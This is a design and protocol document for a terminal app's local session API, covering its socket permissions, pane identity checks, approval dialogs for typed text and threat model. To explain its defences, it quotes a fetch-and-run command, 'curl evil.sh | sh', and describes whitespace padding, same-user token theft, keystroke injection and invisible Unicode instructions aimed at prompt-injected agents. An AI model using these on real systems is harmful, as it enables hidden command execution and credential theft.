# The Halyard session API

Protocol version 1. Status: the server library and the `halyard-msg` client are in
`crates/halyard-ipc`; the app starts the server, backs it with its real panes and shows
the approval dialogs (`crates/halyard-app/src/session_api.rs`, `session_api_ui.rs`,
`approval.rs`). It is on by default and can be turned off with `[session_api] enabled =
false` (`docs/configuration.md`).

## Purpose

Agents, hooks and external tools need a way to talk to Halyard that is documented, open
to any vendor, and safe by default. This API is that interface. It complements the
escape-sequence protocol in `docs/protocol.md`:

| | Escape sequences (`docs/protocol.md`) | Session API (this document) |
|---|---|---|
| Direction | Program in a pane to Halyard | Both ways |
| Who can use it | Anything that prints to the pane, including `cat` of a hostile file | Only processes the kernel says belong to this user, and only with the right identity |
| What it can do | Set the pane's displayed state, agent and message | Report state and notifications for your own pane; with user approval, list, focus, read and type into panes, and subscribe to events |
| Works through ssh, tmux | Yes (the bytes travel with the output) | No (local socket, local process tree) |

A hook that wants the stronger guarantee uses the API; `halyard-msg` does that and falls
back to the escape sequence when no socket is reachable.

Nothing in this API runs a command, and nothing typed by it reaches a pane without the
rules in [Typing into a pane](#typing-into-a-pane).

## Design, and why

- **Unix domain socket, not TCP.** No port is reachable from the network or from a web
  page (no DNS rebinding, no cross-site requests to localhost), and the kernel tells the
  server who connected (uid and pid). Windows is not a target.
- **Newline-delimited JSON-RPC 2.0.** Every language has JSON and sockets in its
  standard library; the Python client below is 18 lines with no dependencies. It is the
  framing ACP and LSP-style tools already use, so integrators know it.
- **Threads, not an async runtime.** One accept thread and one thread per connection
  (capped at 64), plus one per event subscription. A connection waiting on a user
  approval blocks only itself. Nothing runs on the UI thread or the PTY path, and the
  crate pulls in no runtime.
- **Two identities.** Code running inside a pane is identified by where it runs
  (process ancestry), so it needs no setup. Tools outside panes are identified by a
  token the user approved once, with named scopes.

## Transport

### Socket location

| Platform | Directory |
|----------|-----------|
| Linux with `XDG_RUNTIME_DIR` (systemd, elogind) | `$XDG_RUNTIME_DIR/halyard/` |
| macOS | `$TMPDIR/halyard-<uid>/` (`$TMPDIR` is already per user under `/var/folders`) |
| Anything else | `$TMPDIR/halyard-<uid>/`, or `/tmp/halyard-<uid>/` |

The socket is `<directory>/<instance>.sock`, where the instance name is 1 to 32
characters of `[A-Za-z0-9_-]`. The app uses its process id, so several instances never
collide; a tool outside any pane finds the sockets by listing the directory. Inside a pane,
`HALYARD_SOCKET` holds the full path. The socket is removed when Halyard quits.

The app binds the socket on a thread of its own, so a slow grants file lock never delays
the first window. Panes are given the path from the start; until the bind finishes, or if
it fails (another program owns the path, the directory has the wrong owner or mode, the
path is too long), nothing answers there and `halyard-msg` falls back to escape
sequences. A failed bind is shown once in the window's banner, and the terminal works as
usual.

### Permissions

- The directory is created with `mkdir(path, 0700)`, so it never exists with wider
  permissions. If it already exists it must be a real directory (not a symlink), owned by
  the server's effective uid, with no group or other permission bits. Otherwise the
  server refuses to start rather than repair it: someone else may have planted it.
- A leftover socket from a crashed instance is replaced only if it is a socket owned by
  us and nothing answers on it. A live socket means another instance: the server refuses.
  Any other file in the way is refused and left alone.
- The socket is chmod 0600 after `bind`. Linux checks socket file permissions on
  `connect`; some BSD-derived kernels historically did not, so Halyard does not rely on
  them. The 0700 directory and the uid check below carry the weight.
- **Every connection** is checked: the peer's uid from the kernel (`SO_PEERCRED` on
  Linux, `getpeereid` on macOS) must equal the server's effective uid, or the connection
  is closed without a reply. The peer's pid (`SO_PEERCRED`, `LOCAL_PEERPID`) is recorded
  for the ancestry check and for approval dialogs.

### Framing and limits

- One JSON object per line, UTF-8, terminated by `\n` (a `\r\n` is accepted).
- A request line is at most **65536 bytes**, not counting the newline. A longer line gets
  `-32007` and the connection is closed, since the stream cannot be resynchronized
  safely. Responses and notifications are not size-limited (screen text can be large).
- Requests must have an `id` (number or string). Notifications from the client and
  batch arrays are rejected with `-32600`. Unknown envelope fields are `-32600`.
- `params` must be an object or absent. **Unknown fields in params are rejected** with
  `-32602`, so a typo or a field from a future version never silently does nothing.
- Rate limit, per connection: a token bucket of 64 requests refilled at 32 per second.
  Over the limit, a request gets `-32006`; after 64 such rejections the connection is
  closed.
- A connection must complete `halyard.hello` within 10 seconds of being accepted. This is
  a total deadline: sending bytes or other lines meanwhile does not extend it. After a
  successful hello the connection may stay idle (event subscribers do).
- At most 64 concurrent connections; further ones are closed immediately.
- At most 3 `halyard.pair` attempts per connection, and only one approval dialog is
  shown at a time across all connections.

## Identity

Each connection starts anonymous, must call `halyard.hello`, and then takes at most one
identity for its lifetime: a **session** (via `session.attach`) or a **controller** (via
`halyard.pair` or `halyard.authenticate`).

With `[session_api] enabled = false` the app starts no server and sets none of the
variables below. Inside the Flatpak the API is always off, with one banner notice: panes
run on the host through `flatpak-spawn --host`, whose processes the sandbox cannot see, so
no hook could pass the ancestry check (`docs/flatpak.md`). Either way a pane never inherits `HALYARD_SOCKET` or
`HALYARD_SESSION_TOKEN` from the environment Halyard itself was started in, so a Halyard
launched from another Halyard's pane never reports into the outer one.

### Session scope: agents and hooks inside a pane

Halyard sets three variables in every pane:

| Variable | Value |
|----------|-------|
| `HALYARD_SOCKET` | The socket path. |
| `HALYARD_SESSION_ID` | The pane's id, 1 to 128 characters of `[A-Za-z0-9._-]` (same as `docs/protocol.md`). |
| `HALYARD_SESSION_TOKEN` | `hlys_` and 64 hex characters: 256 random bits, unique per pane. |

`session.attach {session_id, token}` succeeds only if both hold:

1. **Ancestry.** The connecting process (pid from the kernel) is the pane's PTY child
   process (normally the shell) or a descendant of it. The server walks the parent chain
   from the peer pid: `/proc/<pid>/stat` on Linux, `proc_pidinfo(PROC_PIDTBSDINFO)` on
   macOS, stopping at pid 1, an unreadable process, a loop, or 1024 steps. A process in
   pane A is not a descendant of pane B's shell, so it cannot speak for pane B.
2. **Token.** The token matches the pane's token (compared as SHA-256 hashes in constant
   time; the server keeps only the hash).

An attached connection may only call `session.report_state`, `session.notify` and
`session.info`, always for its own pane. No method takes a session id for another pane.

**What the token adds, and what it does not.** Ancestry is the authority; the token is a
second factor.

- It defends against pid reuse: the kernel records the peer pid at `connect` time. If
  that process exits and its pid is recycled by a process inside another pane before
  the server checks, ancestry alone would pass. The attacker would also need that pane's
  token.
- It means knowing a session id (ids can show up in titles, logs and screenshots) is
  not enough.
- It does **not** stop a process running as the same user that sets out to steal it.
  On Linux any same-uid process can read `/proc/<pid>/environ` of the pane's shell (unless
  the process is non-dumpable). On macOS, same-uid processes can read another process's
  environment with `sysctl(KERN_PROCARGS2)` (what `ps -E` uses). Every child process of
  the pane inherits it by design.
- Why not a bearer token alone: environment variables leak into child processes, crash
  reports, `env` dumps in logs and CI output. Ancestry is checked by the kernel at the
  moment of the request and cannot be copied into a log.

### Controller scope: external tools

A tool outside any pane (a dashboard, an editor plugin, a script) pairs once:

1. It calls `halyard.pair {client_name, scopes}`.
2. Halyard shows the user a dialog with the requested scopes, the self-reported client
   name, and the kernel-reported pid and executable path of the requester. The user can
   approve a subset of the scopes, or deny.
3. On approval the server creates a grant and returns a token (`hlyg_` and 64 hex
   characters, 256 random bits) **once**. The connection is now authenticated.
4. Later connections call `halyard.authenticate {token}`.

| Scope | Allows |
|-------|--------|
| `sessions:read` | `sessions.list`: id, title, cwd, agent and state of every pane |
| `ui:focus` | `session.focus`: bring a pane to the front |
| `screen:read` | `session.read_screen`: the visible text of a pane |
| `input:write` | `session.send_text`: type into a pane, **with per-request approval** (below) |
| `events:subscribe` | `events.subscribe`: a stream of state, notification and exit events |

Grants live in a JSON file (the app chooses the path; the default is
`$XDG_STATE_HOME/halyard/grants.json`, else `~/.local/state/halyard/grants.json`):

```json
{
  "version": 1,
  "grants": [
    {
      "id": "6f1c2a9e0b7d4c53",
      "client_name": "my-dashboard",
      "scopes": ["sessions:read", "events:subscribe"],
      "token_sha256": "9b71d224bd62f378...",
      "created": 1795320000,
      "last_used": 1795323600,
      "always_allow_input": false
    }
  ]
}
```

- The file is written atomically (new 0600 file in the same directory, fsync, rename) and
  never contains a token, only its SHA-256. A fast hash is correct here: the input is a
  uniformly random 256-bit value, so a slow password hash would add nothing. Token lookup
  compares against every stored hash in constant time.
- On load the file must be a regular file owned by us with no group or other bits;
  otherwise the server refuses it, because a writable grants file would let someone add
  a controller.
- **Every read and every change of the file is a locked read-modify-write:** an exclusive
  `flock` on `grants.json.lock`, a fresh read of the file, the change, the write, then
  unlock. Both files are opened with `O_NOFOLLOW`, so a symlink is refused. Waiting for
  the lock gives up after 5 seconds with an error naming the lock file, and the request
  fails closed. Nothing is cached in memory. So two Halyard instances (or the app and a settings
  tool) sharing the file always agree: a grant revoked in one is rejected by the other on
  its next request, and recording `last_used` can never write a revoked grant back.
- **Revocation** removes the grant (the app's settings page, `GrantsHandle::revoke`, or
  the client itself with `halyard.unpair`). The grant is re-read from disk on every
  request, so a connected client loses access on its next call, and an event stream stops
  at its next event.

### Typing into a pane

`session.send_text` is the only method that can change what happens in a pane, so it has
the strictest rules:

1. The grant must include `input:write`.
2. By default **every request** opens an approval dialog showing the client, the target
   pane and the exact text, with every control and invisible character made visible
   (`\n`, `\r`, `\t`, `\e`, `\u{202e}`, ...).
3. The user may tick "always allow typing from this client" when pairing. Then plain
   text is typed without a dialog, **except** text containing any of:
   - a C0 control character (U+0000 to U+001F, which includes newline, carriage return,
     tab, escape, Ctrl-C, Ctrl-J, and Ctrl-O, which runs the current line in bash),
   - DEL or a C1 control character (U+007F to U+009F),
   - a hidden character: any `Default_Ignorable_Code_Point` (Unicode's
     `DerivedCoreProperties.txt`) or any character of general category `Cf` (format),
     `Zl` or `Zp` (line and paragraph separators). That includes zero-width characters,
     bidi embeddings, overrides and isolates, Unicode tag characters (U+E0000 to U+E007F,
     which can spell out invisible instructions to a language model), variation
     selectors, Hangul fillers, the combining grapheme joiner, soft hyphen and byte order
     mark. The dialog shows each one escaped, as `\u{e0041}`.

   Such text needs a fresh approval every time, whatever the grant says.

Why: a newline or carriage return turns typed text into an executed command, and
several other control characters (Ctrl-O, Ctrl-J, escape sequences bound to
accept-line) do the same in common shells. Halyard's standing rule is no automatic
execution of AI-generated or tool-generated commands, so execution always passes through
the user. Invisible characters are included because they can make the dialog show text
that differs from what is typed. The server enforces this; the app's dialog cannot
weaken it.

**Approving Enter shows what Enter will run.** Text typed under "always allow" sits on
the command line until something sends a newline, and that newline needs approval. So for
each pane the server remembers the text typed under standing permission since the last
request the user approved (the most recent 4 KiB), and every dialog for that pane receives
it as `typed_since_approval`. Approving `\r` after `curl evil.sh | sh` shows
`curl evil.sh | sh` next to the `\r`. An approval clears the record; a denial keeps it.
While a dialog is open, standing sends wait, so nothing can slip in unseen.

If more than 4 KiB was typed that way, the dialog could only show the end of it, and
padding (for example 4096 spaces after the command) would push the command out of view.
So in that case the server **refuses the request without asking**: error `-32005` with
`data.reason` `"typed_since_approval_truncated"` and the message "too much typed since the
last approval; clear the line in the pane". What the user types by hand is not tracked,
so the app calls `IpcServer::reset_typed_since_approval(session_id)` when the user presses
Enter or Ctrl-C in that pane, the keys that end or abandon a command line; approvals work
again from there. (Not Ctrl-U: in readline it deletes only what is left of the cursor, so
text a tool typed to the right of it could survive.) Only real key events from the window count: text sent by
`session.send_text`, a paste, and the terminal's own replies to queries never reset it,
or approving Enter could hide what Enter runs.
Dialogs therefore never receive `typed_since_approval_truncated: true`; the field stays
for clarity.

The grant is checked again after a request has waited for the dialog lock and again after
the dialog closes, so a grant revoked (or an "always allow" withdrawn) in the meantime
sends nothing.

Even with "always allow", plain text can still do things in programs that act on single
keystrokes (a TUI that accepts `y` or a menu number without Enter, an editor in normal
mode). That is why "always allow" is off by default, per client, and should be explained
in the pairing dialog.

## Methods

Examples show one request line (`>`) and the response line (`<`), pretty-printed here.
Every request needs `"jsonrpc": "2.0"` and an `id`; they are omitted after the first
example for brevity.

### `halyard.hello`

Required first. Negotiates the version: the client lists the versions it speaks, the
server picks the highest it shares (today, 1).

```json
> {"jsonrpc": "2.0", "id": 1, "method": "halyard.hello",
   "params": {"protocols": [1], "client_name": "my-tool"}}
< {"jsonrpc": "2.0", "id": 1, "result": {"protocol": 1, "server": "halyard",
   "server_version": "0.1.0-dev",
   "limits": {"max_message_bytes": 65536, "rate_per_sec": 32, "rate_burst": 64}}}
```

With no common version: error `-32001` with `"data": {"supported": [1]}`. A second
`halyard.hello` on the same connection is `-32600`.

### `session.attach` (session scope)

```json
> {"method": "session.attach", "params": {"session_id": "p7", "token": "hlys_3b9f..."}}
< {"result": {"session": {"id": "p7", "title": "zsh", "cwd": "/home/me/src",
   "agent": "claude-code", "state": "working"}}}
```

Errors: `-32002` unknown session or wrong token; `-32008` the caller is not running
inside that pane; `-32600` the connection already has an identity.

### `session.report_state` (session scope)

`state` is exactly one of `working`, `waiting`, `idle`, `done`, `error`. `agent`
(optional) is 1 to 64 characters of `[A-Za-z0-9._-]`. `msg` (optional) is at most 1024
characters with no control or invisible formatting characters.

```json
> {"method": "session.report_state",
   "params": {"state": "waiting", "agent": "claude-code", "msg": "Needs approval"}}
< {"result": {}}
```

### `session.notify` (session scope)

`title` 1 to 256 characters, `body` (optional) at most 4096, no control characters.

```json
> {"method": "session.notify", "params": {"title": "Tests passed", "body": "412 ok"}}
< {"result": {}}
```

### `session.info` (session scope)

```json
> {"method": "session.info", "params": {}}
< {"result": {"session": {"id": "p7", "title": "zsh", "cwd": "/home/me/src",
   "agent": null, "state": null}}}
```

`state` and `agent` are `null` when unknown. Halyard does not guess.

### `halyard.pair`

```json
> {"method": "halyard.pair",
   "params": {"client_name": "my-dashboard", "scopes": ["sessions:read", "input:write"]}}
< {"result": {"grant_id": "6f1c2a9e0b7d4c53", "token": "hlyg_0c41...",
   "scopes": ["sessions:read"], "always_allow_input": false}}
```

The returned scopes are what the user approved, possibly fewer than requested. Errors:
`-32005` the user declined (or approved no scopes); `-32006` more than 3 attempts on this
connection; `-32602` an unknown scope name.

### `halyard.authenticate`

```json
> {"method": "halyard.authenticate", "params": {"token": "hlyg_0c41..."}}
< {"result": {"grant_id": "6f1c2a9e0b7d4c53", "client_name": "my-dashboard",
   "scopes": ["sessions:read"], "always_allow_input": false}}
```

Error `-32002` for an unknown or revoked token.

### `halyard.unpair`

Revokes the caller's own grant; the connection becomes anonymous.

```json
> {"method": "halyard.unpair", "params": {}}
< {"result": {}}
```

### `sessions.list` (`sessions:read`)

```json
> {"method": "sessions.list", "params": {}}
< {"result": {"sessions": [
    {"id": "p7", "title": "zsh", "cwd": "/home/me/src", "agent": "claude-code",
     "state": "waiting"},
    {"id": "p8", "title": "htop", "cwd": null, "agent": null, "state": null}]}}
```

### `session.focus` (`ui:focus`)

Shows the pane: selects its tab, focuses it and raises its window. `-32009` if the window
does not answer within 2 seconds.

```json
> {"method": "session.focus", "params": {"session_id": "p7"}}
< {"result": {}}
```

### `session.read_screen` (`screen:read`)

Returns the pane's visible screen as plain text, rows separated by newlines: what the
pane shows now, so a pane scrolled back returns the scrolled view. At most 256 KiB. It may
contain secrets that are on screen; the pairing dialog says so.

```json
> {"method": "session.read_screen", "params": {"session_id": "p7"}}
< {"result": {"text": "$ cargo test\n   Compiling ...\n"}}
```

### `session.send_text` (`input:write`, plus the rules above)

```json
> {"method": "session.send_text", "params": {"session_id": "p7", "text": "git status"}}
< {"result": {"sent": true, "approval": "standing"}}
```

`approval` is `"user"` when a dialog approved this request, `"standing"` when the
client's "always allow" covered it. Text is 1 byte to 16 KiB. Error `-32005` when the user
declines. The app delivers the text through the pane's paste path: control bytes the
terminal treats as unsafe are neutralized, and when the program enabled bracketed paste
(zsh, fish, bash 5, most editors) the text arrives bracketed, so a newline lands in the
line editor and the user's own Enter still runs it. Without bracketed paste (`sh`, older
bash) an approved newline arrives as Enter and runs the line.

### `events.subscribe` (`events:subscribe`)

```json
> {"method": "events.subscribe", "params": {}}
< {"result": {"subscribed": true}}
```

From then on the server sends notifications (no `id`) at any time, interleaved with
responses:

```json
< {"jsonrpc": "2.0", "method": "session.state_changed", "params": {"session_id": "p7",
   "state": "waiting", "agent": "claude-code", "msg": "Needs approval"}}
< {"jsonrpc": "2.0", "method": "session.notification", "params": {"session_id": "p7",
   "title": "Tests passed", "body": "412 ok"}}
< {"jsonrpc": "2.0", "method": "session.exited", "params": {"session_id": "p8",
   "exit_code": 0}}
```

The app publishes `session.state_changed` once per change of a pane's state, whatever
caused it (a report over this API, an escape sequence, a detected agent starting or
going quiet); `session.notification` for every `session.notify`, and for an OSC 9 or 777
notification while an agent runs in the pane and has not set its state with a report
(then the text is in `title` and `body` is empty); and `session.exited` when a pane's program exits or the pane closes. `msg` is
set only when the state came from a report.

A subscriber more than 256 events behind is disconnected rather than slowing Halyard
down; it should reconnect and call `sessions.list` to resynchronize. Titles, bodies and
messages are untrusted text from programs in panes.

## Error codes

| Code | Name | Meaning |
|------|------|---------|
| -32700 | parse error | The line is not JSON. The connection stays open. |
| -32600 | invalid request | Bad envelope, unknown envelope field, missing or null `id`, batch, repeated `hello`, second identity. |
| -32601 | method not found | No such method. |
| -32602 | invalid params | Params do not match the schema, including unknown fields and unknown scope or state names. |
| -32603 | internal error | A server bug or a failed write of the grants file. |
| -32000 | not initialized | Call `halyard.hello` first. |
| -32001 | unsupported protocol | No version in common; `data.supported` lists the server's. |
| -32002 | unauthenticated | No identity yet, unknown session or bad token, unknown or revoked grant. |
| -32003 | forbidden | Authenticated but not allowed: missing scope (`data.required_scope`), or the wrong kind of identity. |
| -32004 | session not found | The session does not exist or has exited. |
| -32005 | denied | The user declined in the approval dialog. |
| -32006 | rate limited | Too many requests, or too many pairing attempts. |
| -32007 | message too large | Over 65536 bytes. The connection is closed after this error. |
| -32008 | not in session | The connecting process is not running inside the pane it named. |
| -32009 | unavailable | Halyard could not do it right now; the message says why. |

## Threat model

### What it protects against

- **Other users on the machine.** 0700 directory, 0600 socket, and a uid check on every
  connection.
- **The network and web pages.** There is no TCP listener.
- **A process in one pane posing as another pane,** and a process outside every pane
  posing as an agent: ancestry plus token.
- **Tools the user never approved** reading screens, listing panes, focusing or typing:
  pairing with explicit, named scopes, revocable at any time with immediate effect.
- **Silent command execution through the API:** typing needs a dialog per request unless
  the user opted in for that client, and text that could execute (newline, carriage
  return, any control character) or hide its content (hidden Unicode characters) needs a
  dialog every time regardless.
- **A copied grants file:** it holds only SHA-256 hashes of 256-bit tokens.
- **Resource abuse by a buggy client:** size limit, rate limit, connection cap, handshake
  timeout, bounded event queues, pairing attempt cap, one dialog at a time.
- **Escape-sequence injection through the fallback:** `halyard-msg` percent-encodes every
  non-printable or non-ASCII byte, so a message cannot end the sequence or start another.

### What it does not protect against

- **Root.** Root can do anything.
- **Malicious code running as the same user.** This is the honest limit of any local
  IPC design, and it applies here fully. Such code can:
  - read every pane's `HALYARD_SESSION_TOKEN` (`/proc/<pid>/environ` on Linux,
    `KERN_PROCARGS2` on macOS) and, with ptrace, run code inside a pane's process tree,
    which satisfies the ancestry check;
  - ptrace the Halyard process itself on Linux where Yama's `ptrace_scope` allows it,
    and read or change anything, including the PTYs;
  - open the pane's PTY slave device (owned by the user) and write to it, and on kernels
    that still allow `TIOCSTI`, inject keystrokes directly;
  - edit the grants file (it is the user's own 0600 file) to add a grant;
  - read whatever token a paired client stored.

  The session API does not make this worse: it never offers a path to a pane that is
  easier than these. The approval rules exist so that a *confused* or *prompt-injected*
  agent or tool, one that only uses the documented API, cannot run commands without the
  user seeing them.
- **Pid reuse inside the ancestry check** is narrowed but not closed: the kernel reports
  the pid recorded at `connect`. Exploiting it needs the pid to wrap around to a process
  inside the target pane in the moment before the check, and the target's token. Linux
  6.5+ `SO_PEERPIDFD` could close it fully; it is not used yet.
- **Processes that leave the pane's process tree.** A daemon that double-forks, a job
  reparented after its parent exits, or anything run under a tmux or screen server that
  was started outside the pane is not a descendant, and `session.attach` refuses it.
  `halyard-msg` prints a warning and exits 0 in that case; nothing is reported.
- **Self-reported client names.** A same-user program can pair as "VS Code". The dialog
  shows the kernel-reported executable path next to the claim; the user decides.
- **`screen:read` exposes what is on screen,** secrets included, for as long as the grant
  lives. It is gated at pairing time, not per request.
- **Untrusted text.** Notification titles, bodies and state messages come from programs
  in panes. The app must render them as plain text and never act on them.
- **Denial of service by a same-user process** (holding all 64 connections, spamming
  pairing requests from new connections). The dialog lock and per-connection caps limit
  the noise; they do not prevent it.

## `halyard-msg`

A small client for hooks, installed next to `halyard`.

```
halyard-msg state <working|waiting|idle|done|error> [--agent NAME] [--msg TEXT] [--strict]
halyard-msg notify <TITLE> [BODY] [--strict]
halyard-msg info [--strict]
```

- **Outside Halyard** (`HALYARD_SESSION_ID` unset) it does nothing, prints nothing and
  exits 0, so the same hook config works in every terminal.
- It connects to `HALYARD_SOCKET`, calls `halyard.hello`, `session.attach` with
  `HALYARD_SESSION_ID` and `HALYARD_SESSION_TOKEN`, then the request.
- If the socket is unset or unreachable, `state` and `notify` fall back to escape
  sequences written to `/dev/tty`: `ESC ] 7717 ; state=..;agent=..;msg=..;session=.. ST`
  as defined in `docs/protocol.md`, and `ESC ] 777 ; notify ; title ; body ST`.
- Control characters in `--msg`, titles and bodies are replaced with spaces, so a hook
  can pass multi-line text.
- It never runs longer than about 3 seconds.
- Exit status: 0 on success, or on any failure without `--strict` (a warning goes to
  stderr); 1 on failure with `--strict`; 64 for a usage error. **It never exits 2**,
  because Claude Code treats exit status 2 from some hooks as "block this action".

## Example integrations

### Claude Code hooks

In `~/.claude/settings.json` (or a project's `.claude/settings.json`):

```json
{
  "hooks": {
    "UserPromptSubmit": [
      { "hooks": [{ "type": "command", "command": "halyard-msg state working --agent claude-code" }] }
    ],
    "Notification": [
      { "hooks": [{ "type": "command", "command": "halyard-msg state waiting --agent claude-code --msg 'Needs your input'" }] }
    ],
    "Stop": [
      { "hooks": [{ "type": "command", "command": "halyard-msg state done --agent claude-code" }] }
    ]
  }
}
```

In other terminals these hooks are silent no-ops.

### A Python controller using only the standard library

Pair once with `halyard.pair` (Halyard shows the dialog) and keep the token the reply
carries, then:

```python
import json, os, socket

sock = socket.socket(socket.AF_UNIX)
sock.connect(os.environ["HALYARD_SOCKET"])
replies = sock.makefile("r")

def call(method, params, ids=iter(range(1, 1 << 30))):
    req = {"jsonrpc": "2.0", "id": next(ids), "method": method, "params": params}
    sock.sendall((json.dumps(req) + "\n").encode())
    msg = json.loads(replies.readline())  # no events subscribed, so this is our reply
    if "error" in msg:
        raise SystemExit(f"{method}: {msg['error']['message']} ({msg['error']['code']})")
    return msg["result"]

call("halyard.hello", {"protocols": [1], "client_name": "py-sessions"})
call("halyard.authenticate", {"token": os.environ["HALYARD_TOKEN"]})
for s in call("sessions.list", {})["sessions"]:
    print(s["id"], s["state"] or "unknown", s["title"])
```

This file is `crates/halyard-ipc/examples/list_sessions.py`; the test
`python_example_client_lists_sessions` runs it against a real server and checks that this
document embeds it verbatim.

## The app's dialogs

The approval dialogs open in the window that holds the pane (`session.send_text`) or the
active window (`halyard.pair`). A dialog takes keyboard focus, so whatever the user was
typing lands on it instead of the pane, and it is built so that typing cannot approve:

- Plain Enter, Shift+Enter and Ctrl+Enter never approve, at any time.
- Nothing approves for 700 ms after the dialog opens, after any stray key it ignores, and
  after its window becomes active again, so keys already on their way, or typing that goes
  on, land on nothing.
- Approving takes a chord bound to the dialog's own action in its own key context
  (`Approval`): Cmd+Enter on macOS, Ctrl+Shift+Enter elsewhere. The dialog's binding takes
  precedence over the keymap's (Ctrl+Shift+Enter is also Zoom Pane on Linux). A click on
  Approve works too. Escape denies at any time.
- The dialog is modal: while it is open the window's own actions (new tab, close pane,
  palette, zoom, theme) do nothing. Keys no binding takes go to the dialog, never to the
  pane. App-wide actions still work: Quit (which denies by closing) and New Window; and the
  operating system's own shortcuts (switching apps) are not Halyard's to block.
- With no answer within 90 seconds the dialog closes and the request is denied.

The typing dialog shows the tool, the pane (its title, or its folder, and its id), the size
of the text ("2036 characters, 1 line"), the exact text escaped, and the text typed since
the last approval when there is any, all in one box. When that box has to scroll, it is
outlined, a line says there is more below, and Approve stays disabled, saying why, until the
end of the box has been on screen at least once (wheel, Down, Page Down or End). A request
whose escaped text is over 4 KiB is refused without a dialog: error `-32005` with
`data.reason` `"too_long_to_review"` and the message "the text is too long to show in an
approval dialog; send it in smaller pieces, or clear the line in the pane". Runs of spaces
are not drawn as visible marks, so padding shows only as blank space and in the size.

The pairing dialog lists the requested scopes as checkboxes (keys 1 to 5 untick and tick
them), shows `input:write` and `screen:read` in the warning color, and offers "always allow
typing from this tool" only while `input:write` is ticked. That box changes only by a
click, never by a key. It shows the tool's name as a claim next to the kernel-reported pid
and executable.

On top of the server's limits, the app shows at most 3 pairing dialogs a minute across all
connections, and none for 30 seconds after the user denies one; those requests are denied
without a dialog.

Paired tools are listed by the command palette's "Paired Tools (Session API)" command:
name, scopes, whether it may type without asking, last use and a short id. The grants file
is read, and a revocation written, on a background thread (its lock may wait up to 5
seconds for another instance), so the view says "Loading" meanwhile. Enter revokes the
selected tool; its connections lose access on their next request. Grants are kept in
`$XDG_STATE_HOME/halyard/grants.json` (else `~/.local/state/halyard/grants.json`); without
a home directory they last until Halyard quits.
